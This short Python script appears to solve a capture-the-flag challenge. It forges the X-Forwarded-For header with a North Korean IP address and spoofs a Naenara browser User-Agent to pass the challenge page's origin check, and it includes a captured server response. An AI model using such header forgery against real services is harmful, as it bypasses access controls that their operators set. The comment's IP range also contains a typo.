import requests

url = "http://defcon.org.in:6063/index.php"

# north korea ip range : 175.145.176.0 - 175.45.179.255

headers = {
    "X-Forwarded-For": "175.45.176.0"
}

r = requests.get(url, headers=headers)

print r.headers
print r.content

'''
{'host': 'defcon.org.in:6063', 'content-type': 'text/html; charset=UTF-8', 'connection': 'close', 'x-powered-by': 'PHP/7.0.22-0ubuntu0.16.04.1'}
You are not following the instructions given by the supreme-leader
'''

# https://www.whitehatsec.com/blog/north-koreas-naenara-web-browser-its-weirder-than-we-thought/

headers = {
    "X-Forwarded-For": "175.45.176.0",
   "User-Agent": "Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4"
}

r = requests.get(url, headers=headers)

print r.headers
print r.content
